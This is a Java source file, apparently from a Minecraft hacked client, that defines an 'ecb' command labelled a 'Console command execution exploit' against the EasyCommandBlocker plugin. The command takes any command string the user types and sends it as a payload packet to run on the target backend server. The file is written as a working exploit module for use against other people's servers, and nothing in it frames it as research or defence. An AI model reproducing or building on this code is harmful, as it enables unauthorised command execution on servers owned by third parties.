package net.paradise_client.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.commands.SharedSuggestionProvider;
import net.paradise_client.*;
import net.paradise_client.command.Command;
import net.paradise_client.command.CommandManager;

/**
 * EasyCommandBlocker exploit to run commands on the backend server
 */
public class ECBCommand extends Command {
  public ECBCommand() {
    super("ecb", "Console command execution exploit", CommandManager.CommandCategory.EXPLOIT);
  }

  @Override public void build(LiteralArgumentBuilder<SharedSuggestionProvider> root) {
    root.executes(this::incompleteCommand)
      .then(argument("command", StringArgumentType.greedyString()).executes(context -> {
        PacketFactory.sendECB(context.getArgument("command", String.class));
        Helper.printChatMessage("Payload sent!");
        return SINGLE_SUCCESS;
      }));
  }
}
